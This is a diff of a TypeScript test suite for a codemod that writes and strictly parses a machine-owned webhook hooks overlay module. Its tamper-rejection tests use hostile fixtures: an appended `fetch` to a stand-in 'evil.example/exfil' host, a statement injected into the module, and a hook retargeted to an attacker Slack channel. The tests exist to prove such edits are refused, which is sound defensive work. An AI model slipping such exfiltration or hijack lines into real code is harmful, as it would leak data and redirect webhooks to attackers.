@@ -95,10 +95,10 @@ const ARGS = {
 {
   console.log("\n1. the codemod — parse strictness:");
   eq(codemod.parseHooksFile({ hooks: [] }), { hooks: [] }, "an empty overlay parses");
-  eq(codemod.parseHooksText(codemod.stringifyHooks({ hooks: [DECL] })).hooks.length, 1, "a machine-written overlay round-trips");
+  eq(codemod.parseHooksModule(codemod.emitHooksModule({ hooks: [DECL] })).hooks.length, 1, "a machine-written overlay round-trips");
   rejectsWithSync(() => codemod.parseHooksFile({ hooks: [], extra: 1 }), "unknown top-level key", "an unknown top-level key is refused");
   rejectsWithSync(() => codemod.parseHooksFile({}), "needs a `hooks` array", "a missing hooks array is refused");
-  rejectsWithSync(() => codemod.parseHooksText("{"), "not valid JSON", "malformed JSON is refused, loudly");
+  rejectsWithSync(() => codemod.parseHooksModule("{"), "does not start with the generated header", "a file that is not a generated overlay module is refused, loudly");
   rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, retryPolicy: "exponential" }] }), "unknown field", "a field outside the vocabulary is refused — a hand-edit that means something we do not implement must not half-load");
   eq(codemod.parseHooksFile({ hooks: [{ ...DECL, posture: "trigger-only" }] }).hooks[0]!.posture, "trigger-only", "`posture` is in the overlay vocabulary (OPE-214) and round-trips");
   eq(codemod.parseHooksFile({ hooks: [DECL] }).hooks[0]!.posture, undefined, "an overlay written BEFORE posture existed still parses — absence is a fact about the file's age, not a defect");
@@ -125,10 +125,49 @@ const ARGS = {
     const { target: _t, instruction: _i, ...emitOnly } = DECL as unknown as Record<string, unknown>;
     const parsed = codemod.parseHooksFile({ hooks: [emitOnly] });
     ok(parsed.hooks.length === 1 && parsed.hooks[0]!.target === undefined && parsed.hooks[0]!.instruction === undefined, "🔴 a hook with NEITHER target nor instruction parses — that is the emit-only shape, not a malformed hook");
-    eq(codemod.stringifyHooks(codemod.parseHooksText(codemod.stringifyHooks(parsed))), codemod.stringifyHooks(parsed), "…and it still round-trips byte-identically through the canonical form");
+    eq(codemod.stringifyHooks(codemod.parseHooksModule(codemod.emitHooksModule(parsed))), codemod.stringifyHooks(parsed), "…and it still round-trips byte-identically through the canonical form");
     rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, target: 7 }] }), "target", "a non-string `target` is still refused at the JSON boundary");
     rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, instruction: 7 }] }), "instruction", "a non-string `instruction` is still refused at the JSON boundary");
   }
+}
+
+{
+  console.log("\n1b. the codemod — the machine-owned module grammar:");
+  const mod = codemod.emitHooksModule({ hooks: [DECL] });
+  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
+  ok(mod.includes('\nimport type { HooksFile } from "@open-everywhere/core/agent/webhooks/hooks-codemod.js";\n'), "module: carries exactly one TYPE-ONLY import");
+  ok(mod.endsWith(" satisfies HooksFile;\n"), "module: ends with the satisfies clause + newline");
+  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
+  eq(codemod.emitHooksModule(codemod.parseHooksModule(mod)), mod, "module: emit ∘ parseModule is a fixpoint");
+
+  rejectsWithSync(
+    () => codemod.parseHooksModule(mod + 'await fetch("https://evil.example/exfil");\n'),
+    "must contain exactly one",
+    "🔴 module: a hand-added statement is REFUSED — the overlay admits no executable code",
+  );
+  rejectsWithSync(
+    () => codemod.parseHooksModule(mod.replace("\nexport default {", '\nglobalThis.hook = "hijacked";\nexport default {')),
+    "does not start with the generated header",
+    "🔴 module: a statement injected BEFORE the data is REFUSED too",
+  );
+
+  const retargeted = mod.replace(`"target": ${JSON.stringify(DECL.target)}`, '"target": "slack/T1/C_ATTACKER"   ');
+  ok(retargeted !== mod, "module: (fixture) the retarget edit actually changed the bytes");
+  rejectsWithSync(() => codemod.parseHooksModule(retargeted), "not in canonical form", "🔴 module: a hand-edited body is REFUSED, not silently rewritten");
+  ok(
+    codemod.renormalizeHooksModule(retargeted) === codemod.emitHooksModule({ hooks: [{ ...DECL, target: "slack/T1/C_ATTACKER" }] }),
+    "module: renormalize re-emits the hand-edited data in canonical form (the stated recovery)",
+  );
+  rejectsWithSync(
+    () => codemod.renormalizeHooksModule(mod + "process.exit(0);\n"),
+    "must contain exactly one",
+    "module: renormalize REFUSES a code-bearing file rather than stripping the code",
+  );
+  rejectsWithSync(
+    () => codemod.parseHooksModule(codemod.emitHooksModule({ hooks: [{ ...DECL, retryPolicy: "exponential" } as unknown as WebhookHook] })),
+    "unknown field",
+    "module: an out-of-vocabulary field is still refused through the module path",
+  );
 }
 
 {
@@ -137,7 +176,7 @@ const ARGS = {
   ok(once.changed, "a fresh declaration lands");
   const bytes = codemod.stringifyHooks(once.hooks);
   eq(codemod.stringifyHooks(codemod.applyHookDeclaration(codemod.emptyHooksFile(), DECL, []).hooks), bytes, "same inputs ⇒ byte-identical output");
-  eq(codemod.stringifyHooks(codemod.parseHooksText(bytes)), bytes, "parse∘stringify is a fixed point — what the PR-update path leans on");
+  eq(codemod.stringifyHooks(codemod.parseHooksModule(codemod.emitHooksModule(once.hooks))), bytes, "parse∘stringify is a fixed point — what the PR-update path leans on");
   ok(bytes.endsWith("}\n"), "canonical bytes end with a trailing newline");
   ok(bytes.indexOf('"id"') < bytes.indexOf('"readableBy"') && bytes.indexOf('"readableBy"') < bytes.indexOf('"instruction"'), "fields are in declaration order, so the read grant sits where a reviewer looks");
 
@@ -300,9 +339,10 @@ function fakeDeps(state: FakeState) {
 
   const branch = `webhook-declare/${ARGS.requestId}`;
   ok(state.branches[branch] === "base-sha", "the declaration branch is cut from the base sha");
-  eq(state.puts.length, 1, "exactly one hooks.json commit");
-  eq(state.puts[0], codemod.stringifyHooks(codemod.applyHookDeclaration(codemod.emptyHooksFile(), DECL, []).hooks), "🔴 the committed bytes are EXACTLY the deterministic codemod's output — no model authored any part of the diff");
-  ok(Object.keys(state.files)[0]!.endsWith(":agent/webhooks/hooks.json"), "…written to the hooks overlay path, not the grants one");
+  eq(state.puts.length, 1, "exactly one hooks-overlay commit");
+  eq(state.puts[0], codemod.emitHooksModule(codemod.applyHookDeclaration(codemod.emptyHooksFile(), DECL, []).hooks), "🔴 the committed bytes are EXACTLY the deterministic codemod's output — no model authored any part of the diff");
+  ok(Object.keys(state.files)[0]!.endsWith(":agent/webhooks/hooks.generated.ts"), "…written to the hooks overlay path, not the grants one");
+  eq(codemod.parseHooksModule(state.puts[0]!).hooks.length, 1, "…and the committed module passes the round-trip-verifying read the drift lint runs");
   eq(state.prs.length, 1, "one PR");
   ok(state.prs[0].head === branch && state.prs[0].base === "main", "PR opened head→base");
   eq(state.prs[0].title, declarationSentence(DECL), "the PR title is the one deterministic sentence the card also renders");
@@ -398,8 +438,8 @@ function fakeDeps(state: FakeState) {
 
   eq(
     state.puts[0],
-    codemod.stringifyHooks(codemod.applyHookDeclaration(codemod.emptyHooksFile(), HOSTILE, []).hooks),
-    "🔴 the committed hooks.json is the UNMODIFIED declaration — inlineForReview never touches the diff",
+    codemod.emitHooksModule(codemod.applyHookDeclaration(codemod.emptyHooksFile(), HOSTILE, []).hooks),
+    "🔴 the committed overlay module is the UNMODIFIED declaration — inlineForReview never touches the diff",
   );
   ok(outcome.includes("opened PR #9"), "…and the flow still completes normally");
 
